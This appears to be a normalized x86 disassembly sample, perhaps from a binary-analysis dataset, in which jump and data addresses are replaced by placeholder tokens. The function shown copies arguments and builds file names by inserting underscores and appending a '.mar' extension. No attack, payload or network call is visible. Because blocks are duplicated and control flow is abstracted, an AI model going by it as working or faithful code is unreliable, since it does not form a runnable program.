cmp [ ebp - 0x365 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x224 ]
add edx 0x1
mov [ ebp - 0x224 ] edx
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
movsx edx [ ebp + ecx - 0x210 ]
cmp edx 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov ecx [ ebp - 0x220 ]
movsx edx [ ecx + rwxdata ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
mov [ ebp + eax - 0x210 ] 0x5f
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x218 ]
add ecx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] ecx
jge r-xdata
mov eax [ ebp - 0x220 ]
add eax 0x1
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x2e
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x6d
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x61
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
sub edx [ ebp - 0x218 ]
mov eax [ ebp - 0x214 ]
mov cl [ edx + rwxdata ]
mov [ ebp + eax - 0x210 ] cl
jmp r-xdata
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x2ac ] edx
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2b0 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x36c ] ecx
mov edx [ ebp - 0x36c ]
add edx 0x1
mov [ ebp - 0x370 ] edx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x2ac ]
mov dl [ ecx ]
mov [ ebp - 0x2b1 ] dl
add [ ebp - 0x2ac ] 0x1
cmp [ ebp - 0x2b1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2ac ]
sub eax [ ebp - 0x2b0 ]
mov [ ebp - 0x2b8 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x2b8 ]
jae r-xdata
mov eax [ ebp - 0x36c ]
mov cl [ eax ]
mov [ ebp - 0x371 ] cl
add [ ebp - 0x36c ] 0x1
cmp [ ebp - 0x371 ] 0x0
jne r-xdata
mov edx [ ebp - 0x36c ]
sub edx [ ebp - 0x370 ]
mov [ ebp - 0x378 ] edx
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x378 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x214 ]
mov al [ ebp + edx - 0x210 ]
mov [ ecx + rwxdata ] al
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x2bc ] eax
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x2c0 ] ecx
mov edx [ ebp - 0x2c0 ]
mov [ ebp - 0x2c4 ] edx
mov eax [ ebp - 0x224 ]
mov [ ebp + eax - 0x210 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x37c ] edx
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x380 ] eax
mov ecx [ ebp - 0x380 ]
mov [ ebp - 0x384 ] ecx
mov edx [ ebp - 0x224 ]
mov [ ebp + edx - 0x210 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2bc ]
mov cl [ eax ]
mov [ ebp - 0x2c5 ] cl
mov edx [ ebp - 0x2c0 ]
mov al [ ebp - 0x2c5 ]
mov [ edx ] al
mov ecx [ ebp - 0x2bc ]
add ecx 0x1
mov [ ebp - 0x2bc ] ecx
mov edx [ ebp - 0x2c0 ]
add edx 0x1
mov [ ebp - 0x2c0 ] edx
cmp [ ebp - 0x2c5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x224 ]
add edx 0x1
mov [ ebp - 0x224 ] edx
mov edx [ ebp - 0x37c ]
mov al [ edx ]
mov [ ebp - 0x385 ] al
mov ecx [ ebp - 0x380 ]
mov dl [ ebp - 0x385 ]
mov [ ecx ] dl
mov eax [ ebp - 0x37c ]
add eax 0x1
mov [ ebp - 0x37c ] eax
mov ecx [ ebp - 0x380 ]
add ecx 0x1
mov [ ebp - 0x380 ] ecx
cmp [ ebp - 0x385 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov ecx [ ebp - 0x218 ]
movsx edx [ ebp + ecx - 0x210 ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
movsx ecx [ ebp + eax - 0x210 ]
cmp ecx 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x220 ]
movsx edx [ ecx + rwxdata ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov eax [ ebp - 0x220 ]
movsx ecx [ eax + rwxdata ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp + eax - 0x210 ] 0x5f
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x218 ]
mov [ ebp + edx - 0x210 ] 0x5f
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x218 ]
add ecx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] ecx
jge r-xdata
mov eax [ ebp - 0x220 ]
add eax 0x1
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] eax
jge r-xdata
mov edx [ ebp - 0x220 ]
add edx 0x1
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x2e
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x6d
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x61
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
sub edx [ ebp - 0x218 ]
mov eax [ ebp - 0x214 ]
mov cl [ edx + rwxdata ]
mov [ ebp + eax - 0x210 ] cl
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x2e
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x6d
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x61
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
sub ecx [ ebp - 0x218 ]
mov edx [ ebp - 0x214 ]
mov al [ ecx + rwxdata ]
mov [ ebp + edx - 0x210 ] al
jmp r-xdata
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x2cc ] ecx
mov edx [ ebp - 0x2cc ]
add edx 0x1
mov [ ebp - 0x2d0 ] edx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x38c ] eax
mov ecx [ ebp - 0x38c ]
add ecx 0x1
mov [ ebp - 0x390 ] ecx
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x2cc ]
mov cl [ eax ]
mov [ ebp - 0x2d1 ] cl
add [ ebp - 0x2cc ] 0x1
cmp [ ebp - 0x2d1 ] 0x0
jne r-xdata
mov edx [ ebp - 0x2cc ]
sub edx [ ebp - 0x2d0 ]
mov [ ebp - 0x2d8 ] edx
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x2d8 ]
jae r-xdata
mov edx [ ebp - 0x38c ]
mov al [ edx ]
mov [ ebp - 0x391 ] al
add [ ebp - 0x38c ] 0x1
cmp [ ebp - 0x391 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x38c ]
sub ecx [ ebp - 0x390 ]
mov [ ebp - 0x398 ] ecx
mov edx [ ebp - 0x214 ]
cmp edx [ ebp - 0x398 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x214 ]
mov al [ ebp + edx - 0x210 ]
mov [ ecx + rwxdata ] al
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ ebp - 0x214 ]
mov dl [ ebp + ecx - 0x210 ]
mov [ eax + rwxdata ] dl
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x2dc ] edx
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x2e0 ] eax
mov ecx [ ebp - 0x2e0 ]
mov [ ebp - 0x2e4 ] ecx
mov edx [ ebp - 0x224 ]
mov [ ebp + edx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x39c ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x3a0 ] edx
mov eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2dc ]
mov al [ edx ]
mov [ ebp - 0x2e5 ] al
mov ecx [ ebp - 0x2e0 ]
mov dl [ ebp - 0x2e5 ]
mov [ ecx ] dl
mov eax [ ebp - 0x2dc ]
add eax 0x1
mov [ ebp - 0x2dc ] eax
mov ecx [ ebp - 0x2e0 ]
add ecx 0x1
mov [ ebp - 0x2e0 ] ecx
cmp [ ebp - 0x2e5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov ecx [ ebp - 0x39c ]
mov dl [ ecx ]
mov [ ebp - 0x3a5 ] dl
mov eax [ ebp - 0x3a0 ]
mov cl [ ebp - 0x3a5 ]
mov [ eax ] cl
mov edx [ ebp - 0x39c ]
add edx 0x1
mov [ ebp - 0x39c ] edx
mov eax [ ebp - 0x3a0 ]
add eax 0x1
mov [ ebp - 0x3a0 ] eax
cmp [ ebp - 0x3a5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x218 ]
movsx ecx [ ebp + eax - 0x210 ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x220 ]
movsx ecx [ eax + rwxdata ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp + edx - 0x210 ] 0x5f
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] eax
jge r-xdata
mov edx [ ebp - 0x220 ]
add edx 0x1
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x2e
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x6d
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x61
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
sub ecx [ ebp - 0x218 ]
mov edx [ ebp - 0x214 ]
mov al [ ecx + rwxdata ]
mov [ ebp + edx - 0x210 ] al
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x2ec ] eax
mov ecx [ ebp - 0x2ec ]
add ecx 0x1
mov [ ebp - 0x2f0 ] ecx
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x3ac ] edx
mov eax [ ebp - 0x3ac ]
add eax 0x1
mov [ ebp - 0x3b0 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x2ec ]
mov al [ edx ]
mov [ ebp - 0x2f1 ] al
add [ ebp - 0x2ec ] 0x1
cmp [ ebp - 0x2f1 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x2ec ]
sub ecx [ ebp - 0x2f0 ]
mov [ ebp - 0x2f8 ] ecx
mov edx [ ebp - 0x214 ]
cmp edx [ ebp - 0x2f8 ]
jae r-xdata
mov ecx [ ebp - 0x3ac ]
mov dl [ ecx ]
mov [ ebp - 0x3b1 ] dl
add [ ebp - 0x3ac ] 0x1
cmp [ ebp - 0x3b1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3ac ]
sub eax [ ebp - 0x3b0 ]
mov [ ebp - 0x3b8 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x3b8 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ ebp - 0x214 ]
mov dl [ ebp + ecx - 0x210 ]
mov [ eax + rwxdata ] dl
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x2fc ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x300 ] edx
mov eax [ ebp - 0x300 ]
mov [ ebp - 0x304 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x3bc ] eax
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x3c0 ] ecx
mov edx [ ebp - 0x3c0 ]
mov [ ebp - 0x3c4 ] edx
mov eax [ ebp - 0x224 ]
mov [ ebp + eax - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x2fc ]
mov dl [ ecx ]
mov [ ebp - 0x305 ] dl
mov eax [ ebp - 0x300 ]
mov cl [ ebp - 0x305 ]
mov [ eax ] cl
mov edx [ ebp - 0x2fc ]
add edx 0x1
mov [ ebp - 0x2fc ] edx
mov eax [ ebp - 0x300 ]
add eax 0x1
mov [ ebp - 0x300 ] eax
cmp [ ebp - 0x305 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x3bc ]
mov cl [ eax ]
mov [ ebp - 0x3c5 ] cl
mov edx [ ebp - 0x3c0 ]
mov al [ ebp - 0x3c5 ]
mov [ edx ] al
mov ecx [ ebp - 0x3bc ]
add ecx 0x1
mov [ ebp - 0x3bc ] ecx
mov edx [ ebp - 0x3c0 ]
add edx 0x1
mov [ ebp - 0x3c0 ] edx
cmp [ ebp - 0x3c5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x224 ]
add edx 0x1
mov [ ebp - 0x224 ] edx
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
movsx edx [ ebp + ecx - 0x210 ]
cmp edx 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov ecx [ ebp - 0x220 ]
movsx edx [ ecx + rwxdata ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
mov [ ebp + eax - 0x210 ] 0x5f
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x218 ]
add ecx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] ecx
jge r-xdata
mov eax [ ebp - 0x220 ]
add eax 0x1
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x2e
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x6d
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x61
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
sub edx [ ebp - 0x218 ]
mov eax [ ebp - 0x214 ]
mov cl [ edx + rwxdata ]
mov [ ebp + eax - 0x210 ] cl
jmp r-xdata
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x30c ] edx
mov eax [ ebp - 0x30c ]
add eax 0x1
mov [ ebp - 0x310 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x3cc ] ecx
mov edx [ ebp - 0x3cc ]
add edx 0x1
mov [ ebp - 0x3d0 ] edx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x30c ]
mov dl [ ecx ]
mov [ ebp - 0x311 ] dl
add [ ebp - 0x30c ] 0x1
cmp [ ebp - 0x311 ] 0x0
jne r-xdata
mov eax [ ebp - 0x30c ]
sub eax [ ebp - 0x310 ]
mov [ ebp - 0x318 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x318 ]
jae r-xdata
mov eax [ ebp - 0x3cc ]
mov cl [ eax ]
mov [ ebp - 0x3d1 ] cl
add [ ebp - 0x3cc ] 0x1
cmp [ ebp - 0x3d1 ] 0x0
jne r-xdata
mov edx [ ebp - 0x3cc ]
sub edx [ ebp - 0x3d0 ]
mov [ ebp - 0x3d8 ] edx
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x3d8 ]
jae r-xdata
call sub_4065b0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
call sub_408da0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x214 ]
mov al [ ebp + edx - 0x210 ]
mov [ ecx + rwxdata ] al
jmp r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
sub_40b18a
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10c ]
add ecx 0x1
mov [ ebp - 0x10c ] ecx
mov edx [ ebp - 0x10c ]
cmp edx [ ebp - 0x21c ]
jge r-xdata
xor eax eax
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x22c ] edx
mov eax [ ebp - 0x22c ]
add eax 0x1
mov [ ebp - 0x230 ] eax
mov ecx [ ebp - 0x22c ]
mov dl [ ecx ]
mov [ ebp - 0x231 ] dl
add [ ebp - 0x22c ] 0x1
cmp [ ebp - 0x231 ] 0x0
jne r-xdata
mov eax [ ebp - 0x22c ]
sub eax [ ebp - 0x230 ]
mov [ ebp - 0x238 ] eax
je r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x23c ] eax
lea ecx [ ebp - 0x108 ]
mov [ ebp - 0x240 ] ecx
mov edx [ ebp - 0x240 ]
mov [ ebp - 0x244 ] edx
mov eax [ ebp - 0x23c ]
mov cl [ eax ]
mov [ ebp - 0x245 ] cl
mov edx [ ebp - 0x240 ]
mov al [ ebp - 0x245 ]
mov [ edx ] al
mov ecx [ ebp - 0x23c ]
add ecx 0x1
mov [ ebp - 0x23c ] ecx
mov edx [ ebp - 0x240 ]
add edx 0x1
